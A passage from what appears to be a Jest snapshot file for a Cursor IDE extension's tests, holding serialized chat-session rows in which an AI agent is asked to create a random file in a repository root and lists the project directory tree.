ulnerable_sample.py","external":"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py","path":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","scheme":"file"},"codeblockId":"923f9628-4497-4fc2-b68a-aa0ab7936253","status":"completed","languageId":"python","chainedInfo":{"chainedFromCodeblockId":"c1fe6743-d2fd-4ac7-8caf-324502a41ea1","composerId":"59ce5fe8-21af-47bd-8ace-eedc0956072b"},"codeBlockDisplayPreference":"collapsed","createdAt":1762344830325,"diffId":"aa79eb4b-379d-4f56-af62-4562083fb340","lastDiffId":"893a10d8-7f86-49e6-8db8-9e7020ea1220","lastAppliedAt":1762344846573}}},"originalFileStates":{"file:///Users/jonathanafek/src/autofixer/random_file.txt":{"content":"","firstEditBubbleId":"5c0b1d2d-0615-4aa6-9b86-2e1c35baa63c","isNewlyCreated":true,"newlyCreatedFolders":[]},"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py":{"content":"","firstEditBubbleId":"0773d3a3-ed1a-4890-99a3-38ec69a6d85d","isNewlyCreated":true,"newlyCreatedFolders":[]}},"newlyCreatedFiles":[{"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/random_file.txt","external":"file:///Users/jonathanafek/src/autofixer/random_file.txt","path":"/Users/jonathanafek/src/autofixer/random_file.txt","scheme":"file"}},{"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","external":"file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py","path":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py","scheme":"file"}}],"newlyCreatedFolders":[],"lastUpdatedAt":1762344858401,"createdAt":1762293796322,"hasChangedContext":true,"activeTabsShouldBeReactive":true,"capabilities":[{"type":30,"data":{}},{"type":34,"data":{}},{"type":15,"data":{"bubbleDataMap":"{}"}},{"type":22,"data":{}},{"type":18,"data":{}},{"type":19,"data":{}},{"type":33,"data":{}},{"type":32,"data":{}},{"type":23,"data":{}},{"type":6,"data":{}},{"type":16,"data":{}},{"type":24,"data":{}},{"type":25,"data":{}},{"type":21,"data":{}},{"type":31,"data":{}},{"type":29,"data":{}}],"name":"Create a random file in repo root","isFileListExpanded":false,"browserChipManuallyDisabled":false,"browserChipManuallyEnabled":false,"unifiedMode":"agent","forceMode":"edit","usageData":{},"contextUsagePercent":12.320503234863281,"contextTokensUsed":24641,"contextTokenLimit":200000,"allAttachedFileCodeChunksUris":["file:///Users/jonathanafek/src/autofixer/clients/cursor_ext/tsconfig.json","file:///Users/jonathanafek/src/autofixer/random_file.txt","file:///Users/jonathanafek/src/autofixer/vulnerable_sample.py"],"modelConfig":{"modelName":"claude-4.5-sonnet-thinking","maxMode":false},"subComposerIds":[],"capabilityContexts":[],"todos":[],"isQueueExpanded":true,"hasUnreadMessages":false,"gitHubPromptDismissed":false,"totalLinesAdded":119,"totalLinesRemoved":1,"addedFiles":0,"removedFiles":0,"isArchived":false,"isDraft":false,"isCreatingWorktree":false,"isApplyingWorktree":false,"isUndoingWorktree":false,"pendingCreateWorktree":false,"isBestOfNSubcomposer":false,"isBestOfNParent":false,"isSpec":false,"isSpecSubagentDone":false,"stopHookLoopCount":0,"speculativeSummarizationEncryptionKey":"3h141DTBlMRv38M/RfiMRCsDtFMLykMUtnPxpFDysQc=","isNAL":false,"planModeSuggestionUsed":false,"latestChatGenerationUUID":"271ea72c-190e-4be1-8ac3-7b06ae8bb1e0","isAgentic":true,"subtitle":"vulnerable_sample.py, random_file.txt","filesChangedCount":2}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-4 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:b9dda057-0c1e-41fd-bece-80c95ae20984",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"b9dda057-0c1e-41fd-bece-80c95ae20984","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"9465f1e3-1ebf-4e22-af7a-abf06403f36e","attachedFoldersListDirResults":[],"humanChanges":[],"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,41,7,38,8,9,11,12,15,18,19,25,27,43,46,47,29,30,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[{"relativeWorkspacePath":"clients/cursor_ext/tsconfig.json","startLineNumber":1,"lines":[],"languageIdentifier":"","intent":8,"isOnlyIncludedFromFolder":false}],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:27.778Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"let's write a random file in the repo root\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"let's write a random file in the repo root","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"skipRendering":false,"isPlanExecution":false,"context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"ideEditorsState":true},"checkpointId":"43fac872-c115-4757-a251-8b13f82ceab5"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-5 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:eeb70322-a144-4164-b683-84a3380f4b15",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"eeb70322-a144-4164-b683-84a3380f4b15","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"9465f1e3-1ebf-4e22-af7a-abf06403f36e","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:27.825Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":19973.299999952316,"clientRpcSendTime":1762344687825,"clientSettleTime":1762344706121,"clientEndTime":1762344706121},"serverBubbleId":"0f0d91f6-aa8f-4f0b-b4d8-953973b38e75","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e","capabilityType":30,"thinking":{"text":"","signature":"Qwz9OeAOOPcVLon2CYIjyKaDaRPgZBRBiox3ux0L8elaKstI7JfTSXv93wQB3rgrF9H9aU-n4EFIU4SdohWbwhrCIpEkAVzDMfdha3Xs0q_RrkZqkHFhHdodZYyRzwvDGVE-5amQ6ua3J0HZu5BzroYpRPagTYMab949bQIj9aUfGIFJFO7rhoYNIPTwj2c6dZwanL1Opp_TJOv7ANlksi9AhU0VawH7kbF0e82LXNvB-DpDXI1FCFt4zQLPjQErKz64AQs3zvZfG17j7hZ64x36yXJhOi4Pcw7rnkhKUYfr_pdlxsmRWaj2T_rVfwARvxjnvTLcwvHI3SHkW3BlxunEkkBH9wjJDS_gSJ7mk5EPa3yCUKw_9LwPbAqvaqWgi_WdfXSBsJ3bjCXl6Lu_GlzsJNOm7ZKnbe2PVmvZSQ3XHO5kildmEBDKkPJRNqozvNYSwte47bfgbVtqRHgQQoZ5F3yBjmANbYtclwOF-ASXO0KxlnhAo7SSwkmAAXulOQYBoRFDZtjSaQMkJv2OsIUEhNBvUYNEt0JvvtM8nDuZQjFfcVPHbHymucz29nk83aOYiwOPHldc39cHYrE5SCSbAsLIUVX9utjJ81yHILQeeM7jJpx3ztX1bBEzhRx4I17DPqqBd9adKJ6pi2na-fzZRT-kH1kfNVCKgbyYSqRljKvcmJAeUAxqE9Li6MwzrsRS26LfC5tRkQNmQwnL0qkLhnpIOeCJ26UaqKpxGxgVKdvkS_oqGecN4TRBu2lS1gx6wtC4bYtU7lgOEWE_LNBgbWbZPCpZ-35r7DjocSbhkTFa8wG6RriCZ3yUbBRk7NNalOw2ZEgh_MVy0WLAOu4KYEK_c6da8b3N6yM2dbJwhGojeFE9vRXGTM8njnCnRwMkzVeQQ8e6O2rguSvMe06qhDXkgMdX_Qvx_fTMTpjfYuGSDUzcJ1Nbv7VgE48hTyguQokJqJkDjx6lacpICDN2U3wUCxMhl7iSVUks0W8z81IfITnmaHNGbm8sJQGMmQ9LrqrZABKwKEKceQGoobUsfruPj6vmpobjtbG9SGKNu5MheAaWu1W9nR8ivpeo5Rrex3Cr4U_bkw"},"thinkingDurationMs":3496}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-6 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:4349da38-cb8f-4632-8429-30c4581dbf5d",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"4349da38-cb8f-4632-8429-30c4581dbf5d","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:33.522Z","isQuickSearchQuery":false,"text":"\\nCreating a random file in the repo root.\\n","usageUuid":"9465f1e3-1ebf-4e22-af7a-abf06403f36e"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-7 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:18d48ff7-24fa-4963-a0ed-5edfa4991e61",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"18d48ff7-24fa-4963-a0ed-5edfa4991e61","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:11:33.635Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":39,"toolIndex":1,"modelCallId":"71d8b17f-90a7-4928-9d3f-48874cbd4089","toolCallId":"tool_2515f25b-5857-4c17-9bf8-64f83a285fc","status":"completed","rawArgs":"{\\"target_directory\\": \\"/Users/jonathanafek/src/autofixer\\"}","name":"list_dir","params":"{\\"targetDirectory\\":\\"/Users/jonathanafek/src/autofixer\\",\\"shouldEnrichTerminalMetadata\\":false}","additionalData":{},"result":"{\\"directoryTreeRoot\\":{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/fixtures\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":3,\\".zip\\":1},\\"numFiles\\":4},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/graphql\\",\\"childrenFiles\\":[{\\"name\\":\\"mutations.graphql\\"},{\\"name\\":\\"queries.graphql\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".graphql\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/helpers\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":5},\\"numFiles\\":5},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/node_modules\\",\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/pages\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":9},\\"numFiles\\":9},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/settings\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/test-results\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":8},\\"numFiles\\":8}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"playwright.config.ts\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":27,\\".sh\\":1,\\".json\\":5,\\".zip\\":1,\\".graphql\\":2},\\"numFiles\\":36},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/constants\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/files\\",\\"fullSubtreeExtensionCounts\\":{\\".fpr\\":8,\\".zip\\":19,\\".json\\":36,\\".xml\\":3,\\".html\\":2},\\"numFiles\\":68},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/graphql\\",\\"fullSubtreeExtensionCounts\\":{\\".graphql\\":8},\\"numFiles\\":8},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/helpers\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":8},\\"numFiles\\":8},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/settings\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/setup\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".snap\\":19,\\".ts\\":196,\\".graphql\\":12},\\"numFiles\\":227}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"index.d.ts\\"},{\\"name\\":\\"jest.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":211,\\".sh\\":1,\\".json\\":38,\\".fpr\\":8,\\".zip\\":19,\\".xml\\":3,\\".html\\":2,\\".graphql\\":20,\\".snap\\":19},\\"numFiles\\":321},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build/litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cli\\",\\"fullSubtreeExtensionCounts\\":{\\".mjs\\":16,\\".ts\\":325,\\".md\\":3,\\".graphql\\":1,\\".json\\":16,\\".sh\\":2,\\".snap\\":4,\\".java\\":4,\\".js\\":6,\\"\\":1,\\".png\\":2,\\".fpr\\":1,\\".go\\":1,\\".mod\\":1,\\".gitignore\\":1},\\"numFiles\\":384},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/copilot_ext\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":14,\\".sh\\":2,\\".txt\\":1,\\".json\\":10,\\".java\\":1,\\".md\\":1},\\"numFiles\\":29},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cursor_ext\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":11,\\".sh\\":2,\\".md\\":5,\\".json\\":4,\\".snap\\":1,\\".vscdb\\":2,\\".svg\\":1,\\".png\\":1},\\"numFiles\\":27}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":350,\\".sh\\":6,\\".md\\":9,\\".json\\":30,\\".snap\\":5,\\".vscdb\\":2,\\".svg\\":1,\\".png\\":3,\\".txt\\":1,\\".java\\":5,\\".mjs\\":16,\\".graphql\\":1,\\".js\\":6,\\"\\":1,\\".fpr\\":1,\\".go\\":1,\\".mod\\":1,\\".gitignore\\":1},\\"numFiles\\":440},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/analyzer\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":1241,\\".md\\":156,\\".xml\\":330,\\"\\":1830,\\".csproj\\":84,\\".js\\":130,\\".json\\":1740,\\".sh\\":6,\\".jinja2\\":291,\\".png\\":126,\\".yml\\":82,\\".lisp\\":167,\\".ambr\\":4,\\".sql\\":9,\\".cs\\":241,\\".fpr\\":176,\\".cshtml\\":36,\\".css\\":7,\\".sln\\":3,\\".toml\\":1,\\".cfg\\":1,\\".config\\":5,\\".yaml\\":4,\\".html\\":40,\\".tsx\\":1,\\".aspx\\":4,\\".ts\\":39,\\".c\\":4,\\".cpp\\":1,\\".java\\":432,\\".txt\\":17,\\".xsd\\":3,\\".http\\":1,\\".php\\":6,\\".ejs\\":1,\\".user\\":1,\\".conf\\":1,\\".ini\\":1,\\".lock\\":1,\\".go\\":34,\\".mod\\":12,\\".zip\\":1,\\".mjs\\":1,\\".jsp\\":8,\\".properties\\":13,\\".sqlite3\\":1,\\".xhtml\\":2,\\".sum\\":2,\\".cmd\\":1},\\"numFiles\\":7298},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":7,\\".diff\\":6,\\".inference\\":3,\\".txt\\":3,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":26},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/maintenance_service\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":9,\\".ts\\":55,\\"\\":1,\\".sh\\":1,\\".js\\":1,\\".graphql\\":6},\\"numFiles\\":73},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/notifier\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":36,\\".snap\\":4,\\".env\\":1,\\".tsx\\":30,\\".json\\":5,\\"\\":1,\\".js\\":1,\\".sh\\":1,\\".graphql\\":1},\\"numFiles\\":80},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/report_init\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".lock\\":1,\\".py\\":25,\\".conf\\":1,\\".ini\\":1,\\".md\\":1,\\".zip\\":1,\\".toml\\":1,\\"\\":2,\\".cfg\\":1},\\"numFiles\\":36},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".lock\\":1,\\".conf\\":1,\\".py\\":21,\\".md\\":1,\\".toml\\":1,\\"\\":2,\\".cfg\\":1},\\"numFiles\\":30},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scan_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":6,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\".yaml\\":7,\\"\\":1},\\"numFiles\\":20},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scm_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":12,\\".snap\\":1,\\".diff\\":5,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":25}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".py\\":1287,\\".md\\":158,\\".xml\\":330,\\"\\":1839,\\".csproj\\":84,\\".js\\":135,\\".json\\":1766,\\".sh\\":15,\\".jinja2\\":291,\\".png\\":126,\\".yml\\":82,\\".lisp\\":167,\\".ambr\\":4,\\".sql\\":9,\\".cs\\":241,\\".fpr\\":176,\\".cshtml\\":36,\\".css\\":7,\\".sln\\":3,\\".toml\\":3,\\".cfg\\":3,\\".ts\\":155,\\".snap\\":5,\\".diff\\":11,\\".lock\\":3,\\".conf\\":3,\\".ini\\":2,\\".config\\":5,\\".zip\\":2,\\".inference\\":3,\\".txt\\":20,\\".yaml\\":11,\\".env\\":1,\\".tsx\\":31,\\".graphql\\":7,\\".html\\":40,\\".aspx\\":4,\\".c\\":4,\\".cpp\\":1,\\".java\\":432,\\".xsd\\":3,\\".http\\":1,\\".php\\":6,\\".ejs\\":1,\\".user\\":1,\\".go\\":34,\\".mod\\":12,\\".mjs\\":1,\\".jsp\\":8,\\".properties\\":13,\\".sqlite3\\":1,\\".xhtml\\":2,\\".sum\\":2,\\".cmd\\":1},\\"numFiles\\":7588},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations/node_modules\\"}],\\"childrenFiles\\":[{\\"name\\":\\"package.json\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".json\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/dist\\",\\"childrenFiles\\":[{\\"name\\":\\"litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs/cheat_sheets\\",\\"fullSubtreeExtensionCounts\\":{\\".md\\":4},\\"numFiles\\":4}],\\"childrenFiles\\":[{\\"name\\":\\"auth.md\\"},{\\"name\\":\\"github-app-development-guide.md\\"},{\\"name\\":\\"system.md\\"},{\\"name\\":\\"system.png\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".md\\":7,\\".png\\":1},\\"numFiles\\":8},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/7edf2b0b78f5d9340ce0b7e6f0140614_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/a4192acfbc95ee8c4e17dca9c940da6a_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/aacc47867770f0b8078a24fe9ca384bb_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/pip\\"}],\\"childrenFiles\\":[{\\"name\\":\\"7edf2b0b78f5d9340ce0b7e6f0140614\\"},{\\"name\\":\\"a4192acfbc95ee8c4e17dca9c940da6a\\"},{\\"name\\":\\"aacc47867770f0b8078a24fe9ca384bb\\"},{\\"name\\":\\"checkmarx\\"},{\\"name\\":\\"checkmarx.lock\\"},{\\"name\\":\\"codeql\\"},{\\"name\\":\\"codeql.lock\\"},{\\"name\\":\\"dotnet-sonarscanner\\"},{\\"name\\":\\"semgrep.lock\\"},{\\"name\\":\\"sonar\\"},{\\"name\\":\\"sonarqube.lock\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/pulumi\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":63,\\".sh\\":3,\\".yaml\\":5,\\".js\\":4,\\".html\\":3,\\"\\":1,\\".json\\":6},\\"numFiles\\":85},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/web-workers\\"},{\\"absPath\